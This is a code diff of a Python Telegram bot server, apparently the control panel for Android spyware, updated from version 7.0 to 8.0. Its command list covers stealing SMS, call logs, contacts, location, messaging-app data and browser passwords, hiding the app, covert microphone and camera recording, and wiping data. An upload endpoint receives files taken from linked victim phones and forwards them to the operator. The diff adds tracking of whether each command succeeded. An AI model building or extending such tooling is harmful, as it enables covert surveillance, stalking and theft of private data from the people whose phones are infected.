@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Al-Zahra Bot v7.0 - Professional with 200+ Commands"""
+"""Al-Zahra Bot v8.0 - Real-time Response System"""
 
 import asyncio
 import json
@@ -7,7 +7,6 @@ import logging
 import os
 import random
 import time
-import zipfile
 from datetime import datetime
 from aiohttp import web
 
@@ -36,25 +35,22 @@ class DataStore:
         self.devices = {}
         self.commands = {}
         self.codes = {}
-        self.files = {}
         self.last_update_id = 0
-        self.command_log = []
+        self.pending_responses = {}  # انتظار الردود
+        self.command_status = {}     # حالة كل أمر
 
 store = DataStore()
 
 # ═══════════════════════════════════════════
-# أسماء الأوامر بالعربية
+# أسماء الأوامر
 # ═══════════════════════════════════════════
 CMD_NAMES = {
-    # البيانات الأساسية
     "sms": "📨 سحب SMS",
     "calls": "📞 سجل المكالمات",
     "contacts": "📇 جهات الاتصال",
     "notifications": "🔔 الإشعارات",
     "location": "📍 الموقع",
     "camera": "📷 الكاميرا",
-    
-    # التطبيقات
     "whatsapp": "💬 واتساب",
     "messenger": "📩 ماسنجر",
     "instagram": "📸 انستقرام",
@@ -68,22 +64,14 @@ CMD_NAMES = {
     "discord": "🎮 ديسكورد",
     "signal": "🔒 سيجنال",
     "wechat": "💬 وي تشات",
-    
-    # بيانات التطبيقات
     "app_data": "📱 بيانات التطبيقات",
     "installed_apps": "📲 التطبيقات المثبتة",
     "running_apps": "🔄 التطبيقات العاملة",
-    "app_permissions": "🔐 صلاحيات التطبيقات",
-    "app_cache": "🗄️ ذاكرة التخزين المؤقت",
-    
-    # الملفات
     "photos": "🖼️ الصور",
     "videos": "🎬 الفيديوهات",
     "audio": "🎵 الملفات الصوتية",
     "documents": "📄 المستندات",
     "downloads": "⬇️ التحميلات",
-    
-    # النسخ الاحتياطي
     "all": "📦 سحب الكل",
     "all_zip": "🗜️ سحب ZIP",
     "backup_sms": "💾 نسخة SMS",
@@ -91,16 +79,12 @@ CMD_NAMES = {
     "backup_contacts": "💾 نسخة جهات الاتصال",
     "backup_whatsapp": "💾 نسخة واتساب",
     "backup_messenger": "💾 نسخة ماسنجر",
-    
-    # التحكم
     "hide": "🔒 إخفاء",
     "unhide": "🔓 إظهار",
     "lock": "🔐 قفل الشاشة",
     "unlock": "🔓 فتح الشاشة",
     "restart": "🔄 إعادة تشغيل",
     "shutdown": "⏻ إيقاف",
-    
-    # الصوت والفيديو
     "record_on": "🎙️ تفعيل التسجيل",
     "record_off": "⏹️ إيقاف التسجيل",
     "record_mic": "🎤 تسجيل الميكروفون",
@@ -109,8 +93,6 @@ CMD_NAMES = {
     "record_video_front": "🎥 فيديو أمامي",
     "record_video_back": "🎬 فيديو خلفي",
     "screenshot": "📸 لقطة شاشة",
-    
-    # الشبكة
     "wifi_on": "📶 تفعيل WiFi",
     "wifi_off": "📴 إيقاف WiFi",
     "bluetooth_on": "🔵 تفعيل بلوتوث",
@@ -118,11 +100,7 @@ CMD_NAMES = {
     "data_on": "📱 تفعيل البيانات",
     "data_off": "📵 إيقاف البيانات",
     "airplane_on": "✈️ وضع الطيران",
-    "airplane_off": "🛬 إيقاف وضع الطيران",
-    "hotspot_on": "📡 تفعيل النقطة الساخنة",
-    "hotspot_off": "📴 إيقاف النقطة الساخنة",
-    
-    # الإعدادات
+    "airplane_off": "🛬 إيقاف الطيران",
     "brightness_up": "🔆 زيادة السطوع",
     "brightness_down": "🔅 تقليل السطوع",
     "volume_up": "🔊 زيادة الصوت",
@@ -131,111 +109,49 @@ CMD_NAMES = {
     "vibrate": "📳 الاهتزاز",
     "silent": "🤫 الصامت",
     "normal": "🔔 العادي",
-    
-    # الرسائل
     "send_sms": "📤 إرسال SMS",
-    "send_whatsapp": "💬 إرسال واتساب",
     "delete_sms": "🗑️ حذف SMS",
-    "delete_call_log": "🗑️ حذف سجل المكالمات",
-    "delete_contact": "🗑️ حذف جهة اتصال",
-    
-    # التصفح
+    "delete_call_log": "🗑️ حذف المكالمات",
     "browser_history": "🌐 سجل التصفح",
-    "browser_bookmarks": "🔖 الإشارات المرجعية",
+    "browser_bookmarks": "🔖 الإشارات",
     "browser_passwords": "🔑 كلمات المرور",
-    "browser_cookies": "🍪 الكوكيز",
-    "browser_cache": "🗄️ ذاكرة التصفح",
-    "browser_downloads": "⬇️ تحميلات التصفح",
-    
-    # الحسابات
     "accounts": "👤 الحسابات",
     "google_accounts": "📧 حسابات جوجل",
-    "email_accounts": "📬 حسابات البريد",
-    "social_accounts": "👥 حسابات التواصل",
-    
-    # البطارية والأداء
-    "battery_info": "🔋 معلومات البطارية",
-    "cpu_info": "💻 معلومات المعالج",
-    "ram_info": "🧠 معلومات الذاكرة",
-    "storage_info": "💾 معلومات التخزين",
-    "network_info": "📡 معلومات الشبكة",
+    "battery_info": "🔋 البطارية",
+    "cpu_info": "💻 المعالج",
+    "ram_info": "🧠 الذاكرة",
+    "storage_info": "💾 التخزين",
+    "network_info": "📡 الشبكة",
     "device_info": "📱 معلومات الجهاز",
     "system_info": "⚙️ معلومات النظام",
-    
-    # الأمان
     "clear_data": "🗑️ مسح البيانات",
     "clear_cache": "🧹 مسح الكاش",
     "clear_history": "🗑️ مسح السجل",
-    "factory_reset": "⚠️ إعادة ضبط",
-    "encrypt_data": "🔒 تشفير البيانات",
-    "decrypt_data": "🔓 فك التشفير",
-    
-    # إضافية
     "clipboard": "📋 الحافظة",
     "calendar": "📅 التقويم",
     "alarms": "⏰ المنبهات",
-    "ringtones": "🎵 النغمات",
-    "wallpapers": "🖼️ الخلفيات",
     "settings": "⚙️ الإعدادات",
     "permissions": "🔐 الصلاحيات",
-    "accessibility": "♿ إمكانية الوصول",
-    "developer": "👨‍💻 خيارات المطور",
     "about": "ℹ️ حول الجهاز",
     "sim_info": "📱 معلومات SIM",
     "imei": "🔢 IMEI",
-    "serial": "🔢 الرقم التسلسلي",
-    "mac": "🔢 MAC Address",
     "ip": "🌐 IP Address",
-    "dns": "🌐 DNS",
-    "vpn": "🔒 VPN",
-    "firewall": "🛡️ جدار الحماية",
-    "antivirus": "🛡️ مكافحة الفيروسات",
-    "malware_scan": "🔍 فحص البرمجيات",
-    "root_check": "🔍 فحص الروت",
-    "usb_debugging": "🔧 USB Debugging",
-    "unknown_sources": "📲 مصادر غير معروفة",
-    "install_apk": "📦 تثبيت APK",
-    "uninstall_app": "🗑️ إلغاء تثبيت",
-    "update_app": "🔄 تحديث التطبيق",
-    "force_stop": "⏹️ إيقاف إجباري",
-    "clear_app_data": "🗑️ مسح بيانات التطبيق",
-    "app_info": "ℹ️ معلومات التطبيق",
-    "app_size": "📏 حجم التطبيق",
-    "app_version": "🔢 إصدار التطبيق",
-    "app_install_date": "📅 تاريخ التثبيت",
-    "app_update_date": "📅 تاريخ التحديث",
-    "app_last_use": "⏰ آخر استخدام",
-    "app_data_usage": "📊 استهلاك البيانات",
-    "app_battery_usage": "🔋 استهلاك البطارية",
-    "app_notifications": "🔔 إشعارات التطبيق",
-    "app_permissions_detail": "🔐 تفاصيل الصلاحيات",
-    "app_activities": "📱 أنشطة التطبيق",
-    "app_services": "⚙️ خدمات التطبيق",
-    "app_receivers": "📡 مستقبلات التطبيق",
-    "app_providers": "📦 موفرو التطبيق",
-    "app_libraries": "📚 مكتبات التطبيق",
-    "app_features": "⭐ ميزات التطبيق",
-    "app_min_sdk": "🔢 الحد الأدنى SDK",
-    "app_target_sdk": "🔢 المستهدف SDK",
-    "app_signatures": "🔏 توقيعات التطبيق",
-    "app_certificates": "📜 شهادات التطبيق",
-    "app_shared_libs": "📚 المكتبات المشتركة",
-    "app_native_libs": "📚 المكتبات الأصلية",
-    "app_uid": "🔢 UID",
-    "app_gid": "🔢 GID",
-    "app_installer": "📦 المثبت",
-    "app_source": "📂 المصدر",
-    "app_apk_path": "📂 مسار APK",
-    "app_data_path": "📂 مسار البيانات",
-    "app_cache_path": "📂 مسار الكاش",
-    "app_obb_path": "📂 مسار OBB",
-    "app_backup": "💾 نسخة احتياطية",
-    "app_restore": "♻️ استعادة",
-    "app_clone": "📱 استنساخ",
-    "app_hide": "🔒 إخفاء التطبيق",
-    "app_lock": "🔐 قفل التطبيق",
-    "app_freeze": "❄️ تجميد التطبيق",
-    "app_unfreeze": "🔥 إلغاء التجميد",
+}
+
+# ═══════════════════════════════════════════
+# رسائل الحالة
+# ═══════════════════════════════════════════
+STATUS_MESSAGES = {
+    "pending": "⏳ في الانتظار...",
+    "sent": "📤 تم الإرسال",
+    "received": "📥 تم الاستلام",
+    "executing": "🔄 جاري التنفيذ...",
+    "success": "✅ تم بنجاح",
+    "failed": "❌ فشل التنفيذ",
+    "timeout": "⌛ انتهت المهلة",
+    "offline": "📴 الجهاز غير متصل",
+    "no_permission": "🚫 لا تملك صلاحية",
+    "partial": "⚠️ تم جزئياً",
 }
 
 # ═══════════════════════════════════════════
@@ -267,11 +183,11 @@ async def edit_msg(chat_id, msg_id, text, keyboard=None):
         params["reply_markup"] = json.dumps(keyboard)
     return await api_call("editMessageText", params)
 
-async def answer_cb(query_id, text=None):
+async def answer_cb(query_id, text=None, show_alert=True):
     params = {"callback_query_id": query_id}
     if text:
         params["text"] = text
-        params["show_alert"] = True
+        params["show_alert"] = show_alert
     return await api_call("answerCallbackQuery", params)
 
 async def send_file(chat_id, file_path, caption=""):
@@ -290,7 +206,7 @@ async def send_file(chat_id, file_path, caption=""):
         return None
 
 # ═══════════════════════════════════════════
-# لوحات المفاتيح - 200+ زر
+# لوحات المفاتيح
 # ═══════════════════════════════════════════
 def main_kb():
     return {"inline_keyboard": [
@@ -339,6 +255,14 @@ def settings_kb():
         [{"text": "🔙", "callback_data": "back"}]
     ]}
 
+def command_status_kb(did, action):
+    """أزرار متابعة حالة الأمر"""
+    return {"inline_keyboard": [
+        [{"text": "🔄 تحديث الحالة", "callback_data": f"status_{did}_{action}"}],
+        [{"text": "📋 سجل الأوامر", "callback_data": f"history_{did}"}],
+        [{"text": "🔙 رجوع", "callback_data": f"dev_{did}"}]
+    ]}
+
 # ═══════════════════════════════════════════
 # معالجة الرسائل
 # ═══════════════════════════════════════════
@@ -351,14 +275,14 @@ async def on_message(msg):
         return
     
     if txt in ("/start", "/help"):
-        await send_msg(cid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
+        await send_msg(cid, f"🎛️ *Al-Zahra v8.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
     
     elif txt == "/link":
         code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         while code in store.codes:
             code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         store.codes[code] = {"chat_id": cid, "device_id": None}
-        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة")
+        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق")
     
     elif txt == "/devices":
         await show_devices(cid)
@@ -381,7 +305,7 @@ async def on_callback(cb):
     
     # التنقل
     if data == "back":
-        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
+        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v8.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
         return
     
     if data == "devices":
@@ -393,7 +317,7 @@ async def on_callback(cb):
         while code in store.codes:
             code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         store.codes[code] = {"chat_id": cid, "device_id": None}
-        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة",
+        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق",
             {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
         return
     
@@ -417,6 +341,20 @@ async def on_callback(cb):
         await show_device(cid, mid, did)
         return
     
+    # حالة أمر معين
+    if data.startswith("status_"):
+        parts = data.split("_", 2)
+        if len(parts) >= 3:
+            did, action = parts[1], parts[2]
+            await show_command_status(cid, mid, did, action, qid)
+        return
+    
+    # سجل الأوامر
+    if data.startswith("history_"):
+        did = data[8:]
+        await show_command_history(cid, mid, did)
+        return
+    
     # أوامر الجهاز
     if data.startswith("c_"):
         parts = data.split("_", 2)
@@ -427,39 +365,183 @@ async def on_callback(cb):
     
     await answer_cb(qid, "❓")
 
+# ═══════════════════════════════════════════
+# تنفيذ الأوامر مع ردود فورية
+# ═══════════════════════════════════════════
 async def do_command(cid, mid, did, action, qid):
+    """تنفيذ أمر مع رد فوري من السيرفر"""
+    
+    # التحقق من وجود الجهاز
     if did not in store.devices:
         await answer_cb(qid, "❌ الجهاز غير موجود")
+        await send_msg(cid, f"❌ *خطأ*\n\nالجهاز غير موجود أو تم حذفه")
         return
     
     device = store.devices[did]
+    device_name = device.get("model", "?")
+    
+    # التحقق من حالة الاتصال
     if not device.get("online"):
-        await answer_cb(qid, "❌ الجهاز غير متصل")
+        await answer_cb(qid, "📴 الجهاز غير متصل")
+        
+        text = f"❌ *فشل الإرسال*\n\n"
+        text += f"📱 الجهاز: {device_name}\n"
+        text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
+        text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n\n"
+        text += f"📴 *السبب:* الجهاز غير متصل حالياً\n\n"
+        text += f"💡 تأكد أن الجهاز متصل بالإنترنت"
+        
+        await send_msg(cid, text, command_status_kb(did, action))
         return
     
-    # إضافة الأمر
+    # إنشاء معرف فريد للأمر
+    cmd_id = f"{did}_{action}_{int(time.time())}"
+    
+    # إضافة الأمر للقائمة
     if did not in store.commands:
         store.commands[did] = []
     store.commands[did].append(action)
     
-    # اسم الأمر
-    cmd_name = CMD_NAMES.get(action, action)
+    # تسجيل حالة الأمر
+    store.command_status[cmd_id] = {
+        "device_id": did,
+        "action": action,
+        "status": "sent",
+        "sent_time": time.time(),
+        "response": None
+    }
     
-    await answer_cb(qid, f"⏳ تم إرسال: {cmd_name}")
+    # إرسال رسالة الإرسال
+    await answer_cb(qid, f"📤 تم إرسال: {CMD_NAMES.get(action, action)}")
     
-    # رسالة تفصيلia
-    text = f"✅ *تم إرسال الأمر*\n\n"
-    text += f"📱 الجهاز: {device.get('model', '?')}\n"
-    text += f"📋 الأمر: {cmd_name}\n"
+    text = f"📤 *تم إرسال الأمر*\n\n"
+    text += f"📱 الجهاز: {device_name}\n"
+    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
     text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
-    text += f"📊 الحالة: في انتظار التنفيذ"
+    text += f"📊 الحالة: {STATUS_MESSAGES['sent']}\n\n"
+    text += f"⏳ في انتظار رد الجهاز..."
     
-    kb = {"inline_keyboard": [
-        [{"text": "🔄 تحديث", "callback_data": f"c_{did}_{action}"}],
-        [{"text": "🔙 رجوع", "callback_data": f"dev_{did}"}]
-    ]}
+    msg_result = await send_msg(cid, text, command_status_kb(did, action))
     
-    await send_msg(cid, text, kb)
+    # انتظار رد الجهاز (30 ثانية)
+    if msg_result and msg_result.get("ok"):
+        msg_id = msg_result["result"]["message_id"]
+        await wait_for_response(cid, msg_id, cmd_id, did, action, device_name)
+
+async def wait_for_response(cid, msg_id, cmd_id, did, action, device_name):
+    """انتظار رد الجهاز وتحديث الرسالة"""
+    
+    max_wait = 30  # 30 ثانية
+    check_interval = 2  # كل ثانيتين
+    
+    for i in range(0, max_wait, check_interval):
+        await asyncio.sleep(check_interval)
+        
+        # التحقق من وجود رد
+        if cmd_id in store.command_status:
+            status = store.command_status[cmd_id]
+            
+            if status.get("response"):
+                response = status["response"]
+                success = response.get("success", False)
+                message = response.get("message", "")
+                data_size = response.get("data_size", 0)
+                
+                if success:
+                    text = f"✅ *تم التنفيذ بنجاح*\n\n"
+                    text += f"📱 الجهاز: {device_name}\n"
+                    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
+                    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
+                    text += f"📊 الحالة: {STATUS_MESSAGES['success']}\n"
+                    
+                    if data_size > 0:
+                        text += f"📦 حجم البيانات: {data_size} bytes\n"
+                    
+                    if message:
+                        text += f"\n📝 الرد:\n{message}"
+                    
+                    text += f"\n⏱️ مدة التنفيذ: {i + check_interval} ثانية"
+                    
+                    await edit_msg(cid, msg_id, text, command_status_kb(did, action))
+                else:
+                    text = f"❌ *فشل التنفيذ*\n\n"
+                    text += f"📱 الجهاز: {device_name}\n"
+                    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
+                    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
+                    text += f"📊 الحالة: {STATUS_MESSAGES['failed']}\n"
+                    
+                    if message:
+                        text += f"\n📝 السبب:\n{message}"
+                    
+                    await edit_msg(cid, msg_id, text, command_status_kb(did, action))
+                
+                return
+    
+    # انتهت المهلة
+    text = f"⌛ *انتهت المهلة*\n\n"
+    text += f"📱 الجهاز: {device_name}\n"
+    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
+    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
+    text += f"📊 الحالة: {STATUS_MESSAGES['timeout']}\n\n"
+    text += f"💡 الجهاز لم يرد خلال {max_wait} ثانية\n"
+    text += f"تأكد أن الجهاز متصل وأن التطبيق يعمل"
+    
+    await edit_msg(cid, msg_id, text, command_status_kb(did, action))
+
+async def show_command_status(cid, mid, did, action, qid):
+    """عرض حالة أمر معين"""
+    
+    # البحث عن الأمر
+    found = None
+    for cmd_id, status in store.command_status.items():
+        if status["device_id"] == did and status["action"] == action:
+            found = status
+            break
+    
+    if not found:
+        await answer_cb(qid, "❓ لا يوجد سجل لهذا الأمر")
+        return
+    
+    device = store.devices.get(did, {})
+    device_name = device.get("model", "?")
+    
+    status_text = STATUS_MESSAGES.get(found["status"], found["status"])
+    
+    text = f"📋 *حالة الأمر*\n\n"
+    text += f"📱 الجهاز: {device_name}\n"
+    text += f"📋 الأمر: {CMD_NAMES.get(action, action)}\n"
+    text += f"📊 الحالة: {status_text}\n"
+    text += f"⏰ الإرسال: {datetime.fromtimestamp(found['sent_time']).strftime('%H:%M:%S')}\n"
+    
+    if found.get("response"):
+        resp = found["response"]
+        text += f"\n📝 الرد:\n{resp.get('message', 'لا يوجد')}"
+    
+    await edit_msg(cid, mid, text, command_status_kb(did, action))
+
+async def show_command_history(cid, mid, did):
+    """عرض سجل الأوامر"""
+    
+    device = store.devices.get(did, {})
+    device_name = device.get("model", "?")
+    
+    # تصفية الأوامر لهذا الجهاز
+    device_commands = []
+    for cmd_id, status in store.command_status.items():
+        if status["device_id"] == did:
+            device_commands.append(status)
+    
+    if not device_commands:
+        text = f"📋 *سجل الأوامر*\n\n📱 {device_name}\n\n❌ لا توجد أوامر"
+    else:
+        text = f"📋 *سجل الأوامر*\n\n📱 {device_name}\n\n"
+        for cmd in device_commands[-10:]:  # آخر 10 أوامر
+            status_text = STATUS_MESSAGES.get(cmd["status"], cmd["status"])
+            action_name = CMD_NAMES.get(cmd["action"], cmd["action"])
+            time_str = datetime.fromtimestamp(cmd["sent_time"]).strftime('%H:%M:%S')
+            text += f"• {action_name}\n  {status_text} | {time_str}\n\n"
+    
+    await edit_msg(cid, mid, text, device_kb(did))
 
 async def do_setting(cid, mid, action, qid):
     settings_msg = {
@@ -587,10 +669,12 @@ async def register(request):
         return web.json_response({"status": "error"})
 
 async def data(request):
+    """استقبال البيانات من الجهاز مع تحديث حالة الأمر"""
     try:
         reader = await request.multipart()
         did = dtype = None
         path = None
+        
         while True:
             part = await reader.next()
             if part is None: break
@@ -606,16 +690,31 @@ async def data(request):
                         f.write(chunk)
         
         if did and dtype:
+            # تحديث حالة الأمر
+            for cmd_id, status in store.command_status.items():
+                if status["device_id"] == did and status["action"] == dtype:
+                    status["status"] = "success"
+                    status["response"] = {
+                        "success": True,
+                        "message": f"تم استلام البيانات",
+                        "data_size": os.path.getsize(path) if path and os.path.exists(path) else 0
+                    }
+                    break
+            
+            # إرسال إشعار للمالك
             if did in store.devices and store.devices[did].get("linked"):
                 owner = store.devices[did].get("owner")
                 if owner:
                     await send_msg(owner, f"📥 *بيانات جديدة!*\n📱 {store.devices[did].get('model', '?')}\n📁 {dtype}")
                     if path and os.path.exists(path):
                         await send_file(owner, path, f"📱 {dtype}")
-            return web.json_response({"status": "ok"})
-        return web.json_response({"status": "error"})
+            
+            return web.json_response({"status": "ok", "message": "تم الاستلام بنجاح"})
+        
+        return web.json_response({"status": "error", "message": "بيانات ناقصة"})
     except Exception as e:
-        return web.json_response({"status": "error"})
+        logger.error(f"Data error: {e}")
+        return web.json_response({"status": "error", "message": str(e)})
 
 async def commands(request):
     try:
@@ -639,7 +738,7 @@ async def status(request):
 
 async def main():
     logger.info("=" * 60)
-    logger.info("  Al-Zahra Bot v7.0 - 200+ Commands")
+    logger.info("  Al-Zahra Bot v8.0 - Real-time Response")
     logger.info("=" * 60)
     
     app = web.Application()
